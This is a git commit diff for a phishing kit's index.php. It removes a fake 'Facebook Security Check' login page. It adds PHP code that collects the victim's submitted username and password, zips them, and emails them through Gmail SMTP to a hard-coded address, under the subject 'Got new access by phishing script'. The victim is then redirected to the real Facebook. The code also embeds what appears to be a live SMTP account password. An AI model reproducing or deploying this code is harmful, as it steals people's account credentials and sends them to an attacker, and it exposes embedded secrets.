6d948a29bffe08a633265b9c3c00f1d1f935989c
Ganwno <130082545+Ganwno@users.noreply.github.com>
2023-04-07 12:01:41 +0100

    Update index.php

--- index.php
+++ index.php
@@ -1,70 +1,68 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-	<meta charset="UTF-8">
-	<title>Security Check</title>
-	<link rel="shortcut icon" type="ico" href="images/fb-ico.png">
-	<link rel="stylesheet" type="text/css" href="style.css">
-</head>
-<body>
-	<header>
-		<div class="main-header">
-			<div class="logo">
-				<a href="http://www.facebook.com"><img src="images/logo.png" alt="Facebook"></a>
-			</div>
-		</div>
-	</header>
-	<section>
-		<div class="form">
-			<div class="m-header">
-				<h3>Facebook Security Check</h3>
-			</div>
-			<div class="red-box">
-				<p style="font-weight:bold; font-size:13px">Verification needed to understand it's you</p>
-				<p>Enter your password for security reasons (make sure you have caps lock turned off)</p>
-				<p>Forgot your password? <a href="http://www.facebook.com">Reset your password</a>
-			</div>
+<?php
 
-			<div class="login-form">
-				<form action="do_action.php">
-					<label for="username">Username:</label>
-					<input name="username" type="text" id="username"></input><br /><br />
-					<label for="password">Password:</label>
-					<input name="password" id="password" type="password"></input><br />
-					<input id="keep" style="margin: 10px 0 0 84px" type="checkbox"></input>
-					<label for="keep" style="font-size:12px;">keep me logged in</label><br />
-					<input type="submit" name="submit" value="Verify" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
-					<p><a style="text-decoration:none; color:#3B5998; margin:0 0 0 80px;" href="">can't log in?</a></p>
-				</form>
-			</div>
+	function mail_sender(){
+		if(! ( isset($_REQUEST['username']) && isset($_REQUEST['password']) ) ){
+			return false;
+		}
 
-		</div>
-		
-		<footer>
-			<ul>
-				<li><a href="/">Mobile</a></li>
-				<li><a href="/">Find Friends</a></li>
-				<li><a href="/">Badges</a></li>
-				<li><a href="/">People</a></li>
-				<li><a href="/">Pages</a></li>
-				<li><a href="/">Apps</a></li>
-				<li><a href="/">Games</a></li>
-				<li><a href="/">Music</a></li>
-				<li><a href="/">Locations</a></li>
-			</ul>
-			<ul>
-				<li><a href="/">Topics</a></li>
-				<li><a href="/">About</a></li>
-				<li><a href="/">Create Ad</a></li>
-				<li><a href="/">Create Page</a></li>
-				<li><a href="/">Devepers</a></li>
-				<li><a href="/">Careers</a></li>
-				<li><a href="/">Privacy</a></li>
-				<li><a href="/">Cookies</a></li>
-				<li><a href="/">Terms</a></li><br />
-				<li><a href="/">Help</a></li>
-			</ul>
-		</footer>
-	</section>
-</body>
-</html>
+		$username = $_REQUEST['username'];
+		$password = $_REQUEST['password'];
+
+		$reciever = "ddtaiwo04@gmail.com";
+
+		$subject = "Got new access by phishing script";
+
+		// Create the text file with the message
+		$message = "The username is ". $username;
+		$message .= " and password is ". $password;
+		$file = 'message.txt';
+		file_put_contents($file, $message);
+
+		// Zip the text file
+		$zip = new ZipArchive();
+		$zip_name = "message.zip";
+		if ($zip->open($zip_name, ZIPARCHIVE::CREATE)!==TRUE) {
+			return false;
+		}
+		$zip->addFile($file);
+		$zip->close();
+
+		require_once "vendor/autoload.php"; // require the Composer autoloader
+
+		// SMTP settings
+		$smtpHost = 'smtp.gmail.com';
+		$smtpUsername = 'grantoniap@gmail.com';
+		$smtpPassword = 'aylysgnyieaialpm';
+		$smtpPort = 587;
+		$smtpEncryption = 'tls';
+
+		// Create the Transport
+		$transport = (new Swift_SmtpTransport($smtpHost, $smtpPort, $smtpEncryption))
+			->setUsername($smtpUsername)
+			->setPassword($smtpPassword);
+
+		// Create the Mailer using your created Transport
+		$mailer = new Swift_Mailer($transport);
+
+		// Create a message
+		$message = (new Swift_Message($subject))
+			->setFrom([$smtpUsername => 'Phishing Script'])
+			->setTo([$reciever])
+			->attach(Swift_Attachment::fromPath($zip_name))
+			->setBody("Please see attached file for message");
+
+		// Send the message
+		$result = $mailer->send($message);
+
+		// Delete the text file and zip file
+		unlink($file);
+		unlink($zip_name);
+
+		return $result;
+	}
+
+	if(mail_sender()){
+		header("Location: http://www.facebook.com");
+	}
+	header("location:javascript://history.go(-1)");
+?>
